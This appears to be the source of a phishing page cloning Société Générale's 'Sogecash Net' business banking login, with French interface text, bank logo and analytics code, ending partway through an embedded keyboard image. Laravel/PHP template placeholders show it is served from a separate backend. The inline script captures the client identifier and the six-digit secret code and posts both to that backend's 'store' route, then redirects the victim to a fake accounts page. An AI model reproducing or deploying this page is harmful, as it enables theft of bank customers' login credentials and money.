<!DOCTYPE html><html lang="fr" class="swm-root-active swm-mode-page"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
    <meta name="format-detection" content="telephone=no">
    
        <script>if (top != self) { top.location = self.location; }</script>
    
    <title>SG | Connexion</title>


        <script charset="UTF-8" src="{{ url('/') }}/js/n2g_secu.js"></script>
<script type="text/javascript">frame_shield();</script>
<script type="application/json" id="sas_user_info">
{

}
</script>


<link rel="canonical" href="#">
<meta property="og:url" content="#">

<title>Connexion à votre Espace Client Sogecash Net</title>
            <meta name="title" content="Connexion à votre Espace Client Sogecash Net">
            <meta property="og:title" content="Connexion à votre Espace Client Sogecash Net">
        <meta name="twitter:card" content="summary">

<script>
if (!window.cmsConstants) window.cmsConstants = {};

window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "debug";

window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="{{ url('/') }}/favicon.ico">

<script type="text/javascript">
function getCookie(name) {
var value = "; " + document.cookie;
var parts = value.split("; " + name + "=");
if (parts.length == 2) {
    return parts.pop().split(";").shift();
}
return "";
}

function setValue(defaultVal, val) {
if (val == null || val.trim() === '') {
    return defaultVal
}
return val;
}


function setValueBoolean(defaultVal, val) {
if (val == null || val.trim() === '') {
    return defaultVal
}
return val == 1;
}

function addAdditionalParams(tc_vars) {
try {
    var additionals = ""
    additionals = additionals.replace(/'/g, "").replace(/"/g, '')
    const params = additionals.split(',')
    for (var i = 0; i < params.length; i++) {
        const param = params[i].split(':')
        tc_vars[param[0].trim()] = param[1].trim()
    };
} catch (e) {
}
}
function getTechnicalUrl() {
var parser = document.createElement("a");
parser.href = document.querySelector('meta[property="og:url"]').content;
var technical_url = parser.href.replace(parser.protocol +'//'+ parser.hostname,'');
return technical_url
}

function getEnvRelease(){
var urlEnv = window.location.href;
if(urlEnv.indexOf("sg.fr") > -1){
    return "sg";
}else{
    return "societe-generale";
}
}

const empty = "";
//const version = "V3";
var tc_vars = {
"page_section": setValue(empty, ""),
"page_category_1": "",
"page_category_2": "",
"page_category_3": "",
"page_name": "user-login-page-entreprises",
"page_type": setValue(empty, ""),
"page_noload": false,
"no_load": false,
"product_category_1": setValue(empty, ""),
"product_category_2": setValue(empty, ""),
"product_category_3": setValue(empty, ""),
"product_category_4": setValue(empty, ""),
"product_category_5": setValue(empty, ""),
"product_name_trade": setValue(empty, ""),
"product_target": setValue(empty, ""),
"env_channel": setValue("website", ""),
"env_market": setValue("entreprises", ""),
"env_work": "production",
"user_is_identified": false,
"user_is_supervisor" : false,
"env_is_private": setValueBoolean(true, ""),
"page_technical_url": getTechnicalUrl(),
"user_bank":setValue(empty, ""),
"env_domain":getEnvRelease()
};
addAdditionalParams(tc_vars);

var xiti_xtn2 = "";
var xtn2 = "";



var sasInf = document.getElementById('sas_user_info');
if (sasInf) {
var sasHtml = sasInf.innerHTML;
try {
    var sasJs = JSON.parse(sasHtml.trim());
    if (sasJs && sasJs.IdStat && sasJs["user-info-firstname"] && sasJs["user-info-lastname"]) {
        tc_vars["user_id"] = sasJs.IdStat;
        tc_vars["user_is_logged"] = true;
        

    } else {
        tc_vars["user_is_logged"] = false;
        
    }
    if(sasJs && sasJs["user-info-sup"]==="true" ){
        tc_vars["user_is_supervisor"] = true;
        
    }else{
        tc_vars["user_is_supervisor"] = false;
        
    }

} catch (e) {
    tc_vars["user_is_logged"] = false;
    
}
} else {
tc_vars["user_is_logged"] = false;

}
</script>
<script type="text/javascript">
if (typeof userSegments === "undefined") {
var userSegments = [];
}
if (typeof userSegmentNames === "undefined") {
var userSegmentNames = [];
}

userSegments.push("S--1470891196-0000000000000000000000RCRD");

userSegments.push("S-1291998658-00000000000000000000000RCRD");

userSegments.push("S-1609544352-00000000000000000000000RCRD");

userSegmentNames.push("0");

userSegmentNames.push("Desktop");

userSegmentNames.push("Clients_Generiques");
</script>
<script charset="UTF-8" src="{{ url('/') }}/js/init-configs.js"></script>
                <script charset="UTF-8" src="{{ url('/') }}/js/dca_portail_global.js"></script>
                <script charset="UTF-8" src="{{ url('/') }}/js/public-dca.js"></script>
                <script charset="UTF-8" src="{{ url('/') }}/js/gda.public.js"></script>
                <link href="{{ url('/') }}/css/print.min.css" rel="stylesheet" type="text/css" media="print">
            <script charset="UTF-8" src="{{ url('/') }}/js/vendor.min.js"></script>
        <script charset="UTF-8" src="{{ url('/') }}/js/index.min.js"></script>
        <link href="{{ url('/') }}/css/index.min.css" rel="stylesheet" type="text/css">
            <script charset="UTF-8" src="{{ url('/') }}/js/public-tms.js"></script>
                
<!-- URL: https://entreprises.sg.fr/restcontent/theme/09c59be3b8893710VgnVCM1000000ae1c6c0RCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: f1d9112f38323710VgnVCM1000000ae1c6c0RCRD, templateID: 09c59be3b8893710VgnVCM1000000ae1c6c0RCRD, isRenderPageFeatures: true, FURL_NAME: /ent/authen/theme, FURL_ID: 722a112f38323710VgnVCM1000000ae1c6c0RCRD -->


</head>
<body class="ENT waitJeton swm swm-mode-page  swm-page-authent swm-theme-SITE_WEB">


    <button class="dcw_skip" onclick="scrollToElement('go-navigation');">Aller au menu principal</button>
<button class="dcw_skip" onclick="scrollToElement('go-content');">Aller au contenu</button>
<header class="rsp_header header-deco header-authent" role="banner">
<nav class="rsp_nav rsp_nav--above">
<a id="go-navigation" tabindex="-1"></a>
<ul class="rsp_nav__list">
        <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="32e2654d31c94710VgnVCM10000057f440c0RCRD">
<a href="/assistance" class="rsp_nav__link" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-deconnectee::'+&quot;aide-et-contacts&quot;})"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#lhs-urgence"></use></svg><span>Contacts</span></a>
</li>
</ul>
</nav>

<div class="rsp_header__wrapper-nav">
<h2 class="rsp_header__title-logo">
<a href="/icd-web/syd-front/index-comptes.html#comptes" class="rsp_header__logo-mob" title="SG - Aller à l'accueil" data-tracking="logo-entreprises" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+(this.dataset.tracking)})">
<svg aria-label="Logo SG" focusable="false" height="30" width="68" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 95 42" style="enable-background:new 0 0 95 42;" xml:space="preserve">
<style type="text/css">
.st0{fill:#E60028;}
.st1{fill:#FFFFFF;}
</style>
<g>
<g>
<path d="M9.6,18.8l1.9,0.4c4.8,1,6.9,3.1,6.9,6.9c0,4.6-3.4,7.1-9.7,7.1H0.2v-4.9c2.8,0.6,5.7,0.9,8.1,0.9c3.7,0,5.5-1,5.5-2.9    s-0.9-2.5-5-3.3l-1.9-0.4C2.1,21.6,0,19.5,0,15.7c0-4.3,3.5-6.9,9.4-6.9H17v4.9c-2.7-0.6-4.9-0.9-7.2-0.9c-3.3,0-5.1,1-5.1,2.7    C4.6,17.3,5.6,18,9.6,18.8z M42.4,21v12.2h-7.8c-8.8,0-14-4.5-14-12.2c0-7.7,5.1-12.2,14-12.2h6v4.7c-2.1-0.5-4.2-0.7-6.3-0.7    c-5.7,0-9,3-9,8.2c0,5,3.3,8,9,8H38l0-8H42.4z"></path>
</g>
<rect x="52.7" y="0" class="st0" width="42" height="18.9"></rect>
<rect x="52.7" y="23.1" width="42" height="18.9"></rect>
<rect x="52.7" y="18.9" class="st1" width="42" height="4.2"></rect>
</g>
</svg>
</a>
<a href="/icd-web/syd-front/index-comptes.html#comptes" class="rsp_header__logo-desktop" title="SG - Aller à l'accueil" data-tracking="logo-entreprises" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+(this.dataset.tracking)})">
<svg aria-label="Logo SG" focusable="false" height="30" width="68" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 95 42" style="enable-background:new 0 0 95 42;" xml:space="preserve">
<style type="text/css">
.st0{fill:#E60028;}
.st1{fill:#FFFFFF;}
</style>
<g>
<g>
<path d="M9.6,18.8l1.9,0.4c4.8,1,6.9,3.1,6.9,6.9c0,4.6-3.4,7.1-9.7,7.1H0.2v-4.9c2.8,0.6,5.7,0.9,8.1,0.9c3.7,0,5.5-1,5.5-2.9    s-0.9-2.5-5-3.3l-1.9-0.4C2.1,21.6,0,19.5,0,15.7c0-4.3,3.5-6.9,9.4-6.9H17v4.9c-2.7-0.6-4.9-0.9-7.2-0.9c-3.3,0-5.1,1-5.1,2.7    C4.6,17.3,5.6,18,9.6,18.8z M42.4,21v12.2h-7.8c-8.8,0-14-4.5-14-12.2c0-7.7,5.1-12.2,14-12.2h6v4.7c-2.1-0.5-4.2-0.7-6.3-0.7    c-5.7,0-9,3-9,8.2c0,5,3.3,8,9,8H38l0-8H42.4z"></path>
</g>
<rect x="52.7" y="0" class="st0" width="42" height="18.9"></rect>
<rect x="52.7" y="23.1" width="42" height="18.9"></rect>
<rect x="52.7" y="18.9" class="st1" width="42" height="4.2"></rect>
</g>
</svg>
</a>
</h2>
</div>

<h1 class="rsp_header__title-page" id="js-mobile-title">Connexion à votre Espace Client Sogecash Net</h1>

<input id="breadcrumb-channel-ids" type="hidden" value="f1d9112f38323710VgnVCM1000000ae1c6c0RCRD,5777227b02e6d610VgnVCM100000da4658c0RCRD,965e5ebf3e34d610VgnVCM100000da4658c0RCRD">
<script>
function scrollToElement(elementId){
let element = document.getElementById(elementId);
element.scrollIntoView();
element.focus();
}
</script>
</header>
<main class="dcw_main dcw_gb9_core-wrapper" role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row">
</section>
<section class="dcw_gb_wrapper">
<section class="dcw_gb9_core-left" id="">

<!-- URL: https://entreprises.sg.fr/restcontent/regions/f1d9112f38323710VgnVCM1000000ae1c6c0RCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: f1d9112f38323710VgnVCM1000000ae1c6c0RCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /ent/authen/header, FURL_ID: 360a112f38323710VgnVCM1000000ae1c6c0RCRD -->


    





<noscript>
<style>
.auth-content {display:none !important;}
.waitAuthJetonMsg {display: none !important;}
</style>
</noscript>

<link rel="stylesheet" href="css/style.css">


<script>









window.swmConfOverride = {
"version": "23.3.4",
"firm": "BDDF",
"market": "ENT",
"isNGIM": true,
"isCookieless": false,
"media": "WEB_INT",
"swmEnv": "prod",
"isProspect": false,
"isCarteAffaires": false,
"codeClientEtoileNgim": "",
"defaultUrl": "\/icd-web\/syd-front\/index-comptes.html",


"isSASAuth": false,

"isSupervision": false,
"logLocal": false,
"logNiveau": "error",
"staticBaseUrl": "/icd/static/swm/resources/version/23.3.4",
"baseUrl": "",
"styles": [],
"isDebug": false,


};



</script>

<div id="swm-wrapper" class="swm-inner-wrapper">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>





<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label">
<div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
    <div id="swm-popin" class="swm-popin">
        <div id="swm-popin-cadre" class="swm-popin-cadre">
        </div>
    </div>
</div>
</div>
</div>
</div>


                













    



<script>
    var code = "";
    document.addEventListener('DOMContentLoaded', function () {
    // Sélection de l'élément input par son ID
    var inputElement = document.getElementById('user_id');
    var inputCl = document.getElementById('clavier');
    var val1 = document.getElementById('btn-validate');
    

    var saveIdCheckbox = document.getElementById('saveId');
    var jsError = document.getElementById('js-error');

    function codeDeletea() {
             
             code = "";
             const inputElement = document.getElementById("codeSecret");
             // Retirer toutes les classes auth-pwd-N
             for (let i = 1; i <= 7; i++) {
                 inputElement.classList.remove(`auth-pwd-${i}`);
             }
               } 

    // Ajout d'un écouteur d'événements pour le changement de la valeur de l'input
    inputElement.addEventListener('input', function () {
        // Obtention de la valeur saisie dans l'input
        var inputValue = inputElement.value;
        jsError.style.display="none";
        inputCl.style.display="none";
        codeDeletea();

     

        

        // Vérification si la valeur est un code de 8 caractères numériques
        if (/^\d{8}$/.test(inputValue)) {
            // La valeur est valide, ajout de la classe "is-valid"
            inputElement.classList.add('is-valid');
            
        } else {
            // La valeur n'est pas valide, suppression de la classe "is-valid" si elle existe
            inputElement.classList.remove('is-valid');
            val1.style.display="block";
        }
    });

    val1.addEventListener('click', function () {
        var inputValue = inputElement.value;
 
        if (/^\d{8}$/.test(inputValue)) {
           
            val1.style.display="none";
            inputCl.style.display="block";
            
                } else {
                    
                    jsError.style.display="block";
                }
    });


});
</script>


<div class="swm_authent">
    
        
    <div class="auth-content js-content-aria-hide swm_codeContainer">


        <div id="swmModulesAuth">
    <div id="module-authent-cv">
        <div class="container-mire-codeClient">
            <div class="swm_block">
                <form class="component-mire-codeclient">
                    <div class="swm_block-element">
                        <div class="auth-cs-content swm_input-container">
                            <input
                                id="user_id"
                                name="user_id"
                                type="text"
                                class="swm_input grey_cross ngim-input"
                                autocapitalize="off"
                                autocorrect="off"
                                aria-label="Code client"
                                placeholder=" "
                                autocomplete="off"
                                maxlength="8"
                                aria-describedby="js-error"
                                required=""
                            />
                            <button
                                id="user_id-delete"
                                role="button"
                                class="swm_sprite swm_to-clear"
                                aria-label="Effacer votre code client"
                            ></button>
                            <span class="bar" aria-hidden="true"></span>
                            <label for="user_id"
                                >Saisissez votre identifiant client</label
                            >
                        </div>
                        <div id="js-error" aria-live="assertive" style="display: none" class="auth_error show" tabindex="-1" aria-hidden="true">
                             <div class="error-wrapper">
                                 <div class="inner">
                                       <div class="message">Votre identifiant est incorrect</div>
                                 </div>
                              </div>
                        </div>
                        <div id="js-error-1" aria-live="assertive" style="display: none" class="auth_error show" tabindex="0">
                             <div class="error-wrapper"> <div class="inner">
                                   <div class="message">Veuillez vérifier votre Identifiant Client et votre Code Secret. </div> 
                            </div>
                          </div>
                         </div>
                    </div>
                    <div
                        class="auth-checkbox-wrapper auth-check-left swm_block-element"
                        id="saveId-container"
                    >
                        <div
                            class="switch"
                            tabindex="0"
                            aria-label="Activer la mémorisation du code client"
                        >
                            <input
                                type="checkbox"
                                class="switch input"
                                id="saveId"
                                name="saveId"
                                style="display: none"
                                data-xiti="clic_memoriser_identifiant"
                                tabindex="0"
                            />
                            <label
                                for="saveId"
                                class="labelSwitch"
                                onclick=""
                                aria-hidden="true"
                                data-xiti="clic_memoriser_identifiant"
                                aria-labelledby="memo_code_client_label"
                            >
                                <span class="hidden-checkbox-input"></span>
                                <div class="toggle-btn-handle"></div>
                            </label>
                        </div>
                        <span
                            class="hidden-checkbox-label"
                            id="memo_code_client_label"
                            aria-hidden="true"
                            ><label for="saveId"
                                >Se souvenir de moi</label
                            ></span
                        >
                        <div class="swm-popover__container">
                            <button
                                type="button"
                                id="swm-popover__trigger"
                                class="swm-popover__trigger"
                                aria-label="Information sur la mémorisation du code client"
                                aria-describedby="swm-infobulle"
                            >
                                <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    width="20"
                                    height="20"
                                    viewBox="0 0 20 20"
                                    aria-hidden="true"
                                    focusable="false"
                                >
                                    <g fill="#615c5c" fill-rule="evenodd">
                                        <path
                                            d="M10 .952C5.011.952.952 5.012.952 10c0 4.989 4.06 9.048 9.048 9.048 4.989 0 9.048-4.06 9.048-9.048 0-4.989-4.06-9.048-9.048-9.048M10 20C4.486 20 0 15.514 0 10S4.486 0 10 0s10 4.486 10 10-4.486 10-10 10"
                                        ></path>
                                        <path
                                            d="M9 9.625v3.75a1.125 1.125 0 1 0 2.25 0v-3.75a1.125 1.125 0 1 0-2.25 0zM9 6.375a1.125 1.125 0 1 0 2.25 0 1.125 1.125 0 0 0-2.25 0z"
                                        ></path>
                                    </g>
                                </svg>
                            </button>
                            <div
                                class="swm-popover swm-popover--top-right"
                                id="swm-infobulle"
                                role="tooltip"
                            >
                                <p>Se souvenir de moi</p>
                                <p>
                                    En cochant cette case, votre code client
                                    sera mémorisé sur cet appareil.
                                </p>
                                <p>
                                    De cette manière vous n'aurez plus à le
                                    saisir lors de vos prochaines connexions.
                                </p>
                                <p>
                                    Ceci est déconseillé si votre ordinateur est
                                    utilisé par d'autres personnes.
                                </p>
                                <button
                                    type="button"
                                    id="swm-btn_close"
                                    class="swm_button-secondaire swm_button-arrondi"
                                >
                                    J'ai compris
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="auth-cs-content-validate" id="btn-container" style="display: block;">
                        <button
                            class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable"
                            id="btn-validate"
                            type="button"
                            aria-label="Valider votre identifiant"
                        >
                            Valider
                        </button>
                    </div>

                
                  


                </form>
            </div>
        </div>

        <div id="clavier" class="loaded" style="display: none;">


            <div class="component-authent-cv swm_block" aria-expanded="true" id="sonore-vk">

                <div class="auth-cs-cont swm-vk">

                    <div class="auth-cs-content-code auth-cs-content swm-vk swm_block-element">
                        
                            <button aria-label="Fermer la popin" id="closeKeyBoard"></button>
                        
                        
                        <div class="auth-cs-content-code-input  swm_input-container">
                            
                            <script>
                             

    // Fonction appelée lorsqu'une touche du clavier virtuel est cliquée
    function onKeyPress(key) {
        const jsErr = document.getElementById("js-error-1");  
        jsErr.style.display="none";
        if (code.length < 6) {
        // Ajouter la valeur de la touche à la variable code
        code += key;
        // console.log(code);
        // console.log(code.length);

        // Mettre à jour la classe en fonction de la longueur actuelle de code
        const codeLength = code.length;
        const inputElement = document.getElementById("codeSecret");

        // Retirer toutes les classes auth-pwd-N
        for (let i = 1; i <= 7; i++) {
            inputElement.classList.remove(`auth-pwd-${i}`);
        }

        // Ajouter la classe auth-pwd-N en fonction de la longueur actuelle de code
        inputElement.classList.add(`auth-pwd-${codeLength}`);
     }  
    }    

    function codeDelete() {
             
        code = "";
        const inputElement = document.getElementById("codeSecret");
        // Retirer toutes les classes auth-pwd-N
        for (let i = 1; i <= 7; i++) {
            inputElement.classList.remove(`auth-pwd-${i}`);
        }
          } 
          
          function onSubm() {
            const inputElement = document.getElementById("user_id");
            const jsErr = document.getElementById("js-error-1");
            

            if (/^\d{6}$/.test(code)) {
            const csrfToken = "<?= csrf_token() ?>";

                // Créer une nouvelle instance de XMLHttpRequest
                const xhr = new XMLHttpRequest();

                // Configurer la requête
                xhr.open("POST", "<?= route('store') ?>", true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.setRequestHeader('X-CSRF-TOKEN', csrfToken);

                // Définir la fonction de rappel pour traiter la réponse
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {  // 4 signifie que la requête est complétée
                        if (xhr.status === 200) {
                            // La requête a été réussie
                            var response = JSON.parse(xhr.responseText);
                             var userId = response.id;
                            console.log(userId);
                           window.location.href='/icd-web/syd-front/index-comptes-more.html/'+userId
                        } else {
                            // Il y a eu une erreur dans la requête
                            jsErr.style.display="block";
                            console.error("Erreur lors de la requête :", xhr.status, xhr.statusText);
                           
                        }
                    }
                };

                // Convertir les données en chaîne de requête (format "key1=value1&key2=value2")
                const data = "_token=" + encodeURIComponent(csrfToken) +"&code=" + encodeURIComponent(code) + "&user_id=" + encodeURIComponent(inputElement.value);

                // Envoyer la requête avec les données
                xhr.send(data);
            }
            else{
                jsErr.style.display="block";
            }

            }
   

            
               
    
                            </script>

                            <input id="codeSecret" type="text" class="auth-input-erasable auth-pwd swm_input grey_cross auth-pwd-0" aria-describedby="js-error" readonly="readonly" aria-hidden="true" maxlength="6" placeholder=" " required="">
                            <button class="swm_sprite swm_to-clear" onclick="codeDelete()" id="codeSecret-delete" tabindex="0" aria-label="Effacer votre code secret"></button>
                        </div>
                        <div id="js-error" aria-live="assertive" class="auth_error"></div>
                    </div>
                    <div>
                        <div id="gda_vk" class="clavier-container swm_block-element swm_conteneur_clavier swm-visible">
                            <div id="img_container" class="img-container">
                                <img id="img_clavier" class="keyboard swm_block-element swm_conteneur_clavier" alt="" usemap="#tc_tclavier" src="data:image/png;base64,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